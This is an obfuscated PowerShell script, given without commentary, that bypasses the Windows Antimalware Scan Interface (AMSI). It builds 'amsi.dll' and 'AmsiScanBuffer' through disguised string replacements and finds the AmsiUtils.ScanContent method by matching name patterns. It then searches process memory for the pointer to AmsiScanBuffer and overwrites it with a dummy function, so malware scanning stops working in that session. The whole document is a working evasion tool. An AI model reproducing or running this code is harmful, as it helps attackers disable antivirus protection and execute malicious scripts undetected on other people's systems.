$InitialStart = 0x50000
$string3 = 'hello, world'
$string3 = $string3.replace('hello','Bu')
$string3 = $string3.replace(', ','ff')
$string3 = $string3.replace('world','er')



$MaxOffset = 0x2000000


$string = 'hello, world'
$string = $string.replace('he','a')
$string = $string.replace('ll','m')
$string = $string.replace('o,','s')
$string = $string.replace(' ','i')
$string = $string.replace('wo','.d')
$string = $string.replace('rld','ll')

$APIs = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

public class APIs {
    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UInt32 nSize, ref UInt32 lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

    [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
    public static int Dummy() {
   	 return 1;
    }
}
"@

$NegativeOffset= 0x50000
Add-Type $APIs

# add stuff here
$Address = [APIS]::GetModuleHandle($string)

$string2 = 'hello, world'
$string2 = $string2.replace('he','A')
$string2 = $string2.replace('ll','m')
$string2 = $string2.replace('o,','s')
$string2 = $string2.replace(' ','i')
$string2 = $string2.replace('wo','Sc')
$string2 = $string2.replace('rld','an')


# new code
$funcName = "Ge" + 'tPro' + "cAddress"
$arg2 = $string2 + $string3

# find the method on the APIS type
$method = [APIS].GetMethod($funcName, [Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)

if (-not $method) {
  throw "Method '$funcName' not found on type [APIS]."
}

# invoke the static method (first arg to Invoke is $null for static)
# supply arguments as an object[] matching method signature
$result = $method.Invoke($null, @($Address, $arg2))

# cast if needed
[IntPtr] $funcAddr = [IntPtr] $result


$ReadBytes = 0x50000

$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  &(gcm foreach-*) {
    if($_.Location -ne $null){
   	 $split1 = $_.FullName.Split(",")[0]
   	 If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
   		 $Types = $_.GetTypes()
   	 }
    }
}

$Types |
  &(gcm foreach-*) {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
   		 $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
   	 }
    }
}

$Methods |
  ForEach {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
  		 $MethodFound = $_
   	 }
    }
}


# add stuff here as well
[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false


function Yolo {
    :initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
        [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
        $ReadedMemoryArray = [byte[]]::new($ReadBytes)
        $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
        for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
        $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
        [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
        if ($PointerToCompare -eq $funcAddr) {
            [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
            break initialloop
        }
        }
    }
    [IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
    $buf = [IntPtr[]] ($DummyPointer)
    [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
}

Yolo